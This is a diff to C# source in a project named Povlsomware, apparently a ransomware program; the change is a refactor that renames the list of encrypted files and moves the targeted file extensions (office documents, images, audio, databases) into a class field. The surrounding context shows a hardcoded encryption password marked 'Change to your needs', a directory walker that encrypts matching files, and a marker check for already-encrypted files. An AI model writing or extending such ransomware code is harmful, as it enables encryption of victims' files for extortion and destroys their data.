@@ -14,8 +14,10 @@ namespace Povlsomware
     class Program
     {
         public static int count = 0;
-        public static List<string> myFiles = new List<string>();
+        public static List<string> encryptedFiles = new List<string>();
         private static readonly string password = "blahblah"; //The Encryption password. Change to your needs. 
+        private static readonly string[] extensionsToEncrypt = { "mp3", "jpg", "png", "jpeg", "txt", "doc", "docx", "docm", "xls", "xlsx", "xlsm", "ppt", "pptx", "pptm", "accdb" }; //files to decrypt
+
 
         [STAThread]
         public static string GetPass()
@@ -111,7 +113,7 @@ namespace Povlsomware
                     stream.Write(bytesEncrypted, 0, bytesEncrypted.Length);
                     Console.WriteLine("Encrypted: " + fileUnencrypted);
                     count++;
-                    myFiles.Add(fileUnencrypted);
+                    encryptedFiles.Add(fileUnencrypted);
                 }
             }
         }
@@ -133,9 +135,8 @@ namespace Povlsomware
         //action 1 = encrypt, 0 = decrypt
         public static void ProcessDirectory(string targetDirectory, int action, string password)
         {
-            string[] exts = { "mp3", "jpg", "png", "jpeg", "txt", "doc", "docx", "docm", "xls", "xlsx", "xlsm", "ppt", "pptx", "pptm", "accdb" }; //files to decrypt
             // Process the list of files found in the directory.
-            var fileEntries = Directory.EnumerateFiles(targetDirectory, "*.*").Where(file => exts.Any(x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase)));
+            var fileEntries = Directory.EnumerateFiles(targetDirectory, "*.*").Where(file => extensionsToEncrypt.Any(x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase)));
             foreach (string fileName in fileEntries)
             {
                 ProcessFile(fileName, action, password);
@@ -164,7 +165,7 @@ namespace Povlsomware
             if (mark.SequenceEqual(firstFourBytes))
             {
                 count++;
-                myFiles.Add(fileName);
+                encryptedFiles.Add(fileName);
                 return true;
             }
             return false;
